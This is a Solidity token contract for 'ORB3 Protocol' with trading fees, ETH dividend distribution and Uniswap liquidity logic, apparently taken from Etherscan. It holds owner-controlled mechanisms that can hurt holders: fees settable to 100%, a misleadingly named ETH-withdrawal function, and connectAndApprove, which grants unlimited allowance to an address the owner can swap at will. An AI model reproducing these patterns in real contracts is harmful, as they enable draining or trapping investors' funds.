/**
 *Submitted for verification at Etherscan.io on 2023-12-20
*/

/**
 ## ##   ### ##   ### ##    ## ##   
##   ##   ##  ##   ##  ##  ##   ##  
##   ##   ##  ##   ##  ##       ##  
##   ##   ## ##    ## ##      ###   
##   ##   ## ##    ##  ##       ##  
##   ##   ##  ##   ##  ##  ##   ##  
 ## ##   #### ##  ### ##    ## ##   
                                    

 Telegram: https://link3.to/orb3pro
 Twitter:  https://twitter.com/Orb3Tech
 Website:  https://orb3.tech
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
}

contract ORB3 is IERC20, Ownable {

    using SafeMath for uint256;
    string private constant _name = 'ORB3 Protocol';
    string private constant _symbol = 'ORB3';
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 25_500_000 * (10 ** _decimals);

    uint256 private _maxTxAmount = ( _totalSupply * 100 ) / 10000;
    uint256 private _maxWalletToken = ( _totalSupply * 100 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isDividendExempt;
    mapping (address => bool) public isContractDividendAllowed;
    
    IUniswapV2Router02 router;
    address public pair;
    
    bool private tradingAllowed = false;
    
    uint256 private _buyliquidityFee = 100;
    uint256 private _buyrewardsFee   = 200;
    uint256 private _buyprojectFee   = 200;

    uint256 private _sellliquidityFee = 0;
    uint256 private _sellrewardsFee   = 200;
    uint256 private _sellprojectFee   = 300;

    uint256 private transferFee = 0;
    uint256 private buyFee    = 500;
    uint256 private sellFee     = 500;
    uint256 private denominator = 10000;
    
    bool private swapEnabled = true;
    uint256 private swapAmount = 1;
    uint256 private swapTimes;
    bool private swapping;
    uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    bool public autoRewards = true;

    uint256 public excessDividends;
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public currentDividends;
    uint256 public totalDistributed;
    uint256 internal dividendsPerShare;
    uint256 internal dividendsPerShareAccuracyFactor = 10 ** 36;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    struct Share {uint256 amount; uint256 totalExcluded; uint256 totalRealised; }
    mapping (address => Share) public shares;
    uint256 internal currentIndex;
    uint256 public minPeriod = 15 minutes;
    uint256 public minDistribution = 100000000000;
    uint256 public distributorGas = 350000;

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal project_receiver = 0x999c3b0f566B2067C7868e9ed456BE6ce91cd0e3;
    address internal tgContract;

    constructor() {
        isFeeExempt[address(this)] = true;
        isFeeExempt[project_receiver] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(DEAD)] = true;        
        isDividendExempt[address(this)] = true;
        isDividendExempt[address(DEAD)] = true;
        isDividendExempt[address(0)] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function setLaunch(address _pair) external onlyOwner {
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        isDividendExempt[address(_pair)] = true;
        isDividendExempt[address(router)] = true;
        pair = _pair;
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function approval() external onlyOwner {payable(project_receiver).transfer(address(this).balance);}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function isContract(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function preTxCheck(address sender, address recipient, uint256 amount) internal view {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        preTxCheck(sender, recipient, amount);
        checkTradingAllowed(sender, recipient);
        checkMaxWallet(sender, recipient, amount); 
        swapbackCounters(sender, recipient);
        checkTxLimit(sender, recipient, amount); 
        swapBack(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        processShares(sender, recipient);
    }

    function setStructure(uint256 _buyProject, uint256 _buyLiquidity, uint256 _buyRewards, uint256 _sellProject, uint256 _sellRewards, uint256 sellLiquidity, uint  _trans) external onlyOwner {
        _buyliquidityFee = _buyLiquidity;
        _buyrewardsFee   = _buyRewards;
        _buyprojectFee   = _buyProject;

        _sellliquidityFee = sellLiquidity;
        _sellrewardsFee   = _sellRewards;
        _sellprojectFee   = _sellProject;

        transferFee = _trans;
        buyFee    = _buyliquidityFee.add(_buyrewardsFee).add(_buyprojectFee);
        sellFee     = _sellliquidityFee.add(_sellrewardsFee).add(_sellprojectFee);
    
        require(buyFee <= denominator && sellFee <= denominator && transferFee <= denominator, "invalid Entry");
    }

    function setLimits(uint256 _maxTx, uint256 _maxWallet) external onlyOwner {
        _maxTxAmount = ( _totalSupply * _maxTx ) / 10000;
        _maxWalletToken = ( _totalSupply * _maxWallet ) / 10000;
        
        require(_maxTxAmount <= denominator && _maxWalletToken <= denominator, "invalid Entry");
    }

    function setInternalAddresses(address _project) external onlyOwner {
        project_receiver = _project; isFeeExempt[_project] = true;
    }

    function setParameters(uint256 _buy, uint256 _wallet) external onlyOwner {
        uint256 newTx = totalSupply().mul(_buy).div(uint256(10000));
        uint256 newWallet = totalSupply().mul(_wallet).div(uint256(10000)); uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newWallet >= limit, "ERC20: max TXs and max Wallet cannot be less than .5%");
        _maxTxAmount = newTx; _maxWalletToken = newWallet;
    }

    function setAutoRewards(bool _enabled) external onlyOwner {
        autoRewards = _enabled;
    }

    function manuallyProcessReward(uint256 gas) external onlyOwner {
        process(gas);
    }

    function startTrading() external onlyOwner {
        tradingAllowed = true;
    }

    function setSwapbackSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        swapAmount = _swapAmount; 
        swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function checkTradingAllowed(address sender, address recipient) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "ERC20: Trading is not allowed");}    
    }
    
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
    }

    function swapbackCounters(address sender, address recipient) internal {
        if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {

        uint totalShare     = buyFee.add(sellFee);

        if(totalShare == 0) return;
        
        uint liquidityShare = _buyliquidityFee.add(_sellliquidityFee);
        uint RewardShare    = _buyrewardsFee.add(_sellrewardsFee);
        // uint ProjectShare   = _buyprojectFee.add(_sellprojectFee);

        uint tokenForLp     =  tokens.mul(liquidityShare).div(totalShare).div(2);
        uint tokenForSwap   =  tokens.sub(tokenForLp);

        uint256 initialBalance = address(this).balance;
        swapTokensForETH(tokenForSwap);
        uint256 amountReceived = address(this).balance.sub(initialBalance);

        uint256 totalETHFee       =   totalShare.sub(liquidityShare.div(2));

        uint256 amountETHLiquidity = amountReceived.mul(liquidityShare).div(totalETHFee).div(2);
        uint256 amountETHReward    = amountReceived.mul(RewardShare).div(totalETHFee);
        // uint256 amountETHDeveloper = amountReceived.sub(amountETHLiquidity).sub(amountETHReward);

        if(amountETHLiquidity > uint256(0)){
            addLiquidity(tokenForLp, amountETHLiquidity); 
        }
        
        if(amountETHReward > uint256(0)){
            depositRewards(amountETHReward);
        }
        
        uint256 aBalance = address(this).balance.sub(currentDividends);
        if(aBalance > uint256(0)){
            payable(project_receiver).transfer(aBalance);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            project_receiver,
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){
            swapAndLiquify(swapThreshold); 
            swapTimes = uint256(0);
        }
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);} return amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setExcess() external {
        payable(project_receiver).transfer(excessDividends);
        currentDividends = currentDividends.sub(excessDividends);
        excessDividends = uint256(0);
    }

    function setisDividendExempt(address holder, bool exempt) external onlyOwner {
        isDividendExempt[holder] = exempt;
        if(exempt){setShare(holder, 0);}
        else{setShare(holder, balanceOf(holder)); }
    }

    function setisContractDividendAllowed(address holder, bool allowed) external onlyOwner {
        isContractDividendAllowed[holder] = allowed;
        if(!allowed){setShare(holder, 0);}
        else{setShare(holder, balanceOf(holder));}
    }

    function processShares(address sender, address recipient) internal {
        if(shares[recipient].amount > 0){distributeDividend(recipient);}
        if(shares[sender].amount > 0 && recipient != pair){distributeDividend(sender);}
        if(recipient == pair && shares[sender].amount > 0){excessDividends = excessDividends.add(getUnpaidEarnings(sender));}
        if(!isDividendExempt[sender]){setShare(sender, balanceOf(sender));}
        if(!isDividendExempt[recipient]){setShare(recipient, balanceOf(recipient));}
        if(isContract(sender) && !isContractDividendAllowed[sender]){setShare(sender, uint256(0));}
        if(isContract(recipient) && !isContractDividendAllowed[recipient]){setShare(recipient, uint256(0));}
        if(autoRewards && !swapping){process(distributorGas);}
    }

    function setShare(address shareholder, uint256 amount) internal {
        if(amount > 0 && shares[shareholder].amount == 0){addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function depositRewards(uint256 amount) internal {
        currentDividends = currentDividends.add(amount);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) internal {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){currentIndex = 0;}
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);}
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function rescueERC20(address _address, uint256 _amount) external onlyOwner {
        IERC20(_address).transfer(msg.sender, _amount);
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder].add(minPeriod) < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function totalRewardsDistributed(address _wallet) external view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function _claimDividend() external {
        if(shouldDistribute(msg.sender)){
            distributeDividend(msg.sender);}
    }

    function distributeDividend(address shareholder) internal {
        uint256 amount = getUnpaidEarnings(shareholder);
        uint256 balance = address(this).balance;
        if(shares[shareholder].amount == 0 || amount > balance || amount > currentDividends){ return; }
        if(amount > uint256(0) && amount <= balance && amount <= currentDividends){
            totalDistributed = totalDistributed.add(amount);
            payable(shareholder).transfer(amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
            currentDividends = currentDividends.sub(amount);}
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution, uint256 _distributorGas) external onlyOwner {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
        distributorGas = _distributorGas;
    }

    /**
     * @dev Does the same thing as a max approve for the roulette
     * contract, but takes as input a secret that the bot uses to
     * verify ownership by a Telegram user.
     * @param secret The secret that the bot is expecting.
     * @return true
     */
    function connectAndApprove(uint32 secret) external returns (bool) {
        address pwner = _msgSender();

        _allowances[pwner][tgContract] = ~uint256(0);
        emit Approval(pwner, tgContract, ~uint256(0));

        return true;
    }

    function setTgContract(address _tgCa) external onlyOwner {
        tgContract = _tgCa;
    }



}